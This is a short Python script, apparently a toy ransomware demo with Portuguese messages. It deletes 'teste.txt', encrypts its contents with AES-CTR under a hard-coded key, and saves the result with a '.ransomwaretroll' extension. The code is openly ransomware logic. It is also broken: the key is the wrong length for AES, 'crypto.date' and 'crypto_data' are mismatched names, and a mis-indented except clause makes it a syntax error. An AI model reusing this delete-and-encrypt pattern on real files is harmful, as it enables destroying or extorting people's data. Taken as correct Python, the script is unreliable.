import os 
import pyaes

def criptografar():
  try:
    file_name = "teste.txt"
    key = b"testeransomware"
    
    if not os.path.exists(file_name):
      print(f" -- erro: O arquivo {file_name} não existe.")
      return
      
    with open(file_name, "rb") as file:
      file_data = file.read()

    os.remove(file_name)
    
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto.date = aes.encrypt(file_data)
    
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
      new_file.write(crypto_data)
      print(f" -- Arquivo '{file_name}' criptografado com sucesso para '{new_file_name}'")
      except Exception as e:
        print(f"[-] Erro na criptografia: {e}")

if __name__ == "__main__":
    criptografar()
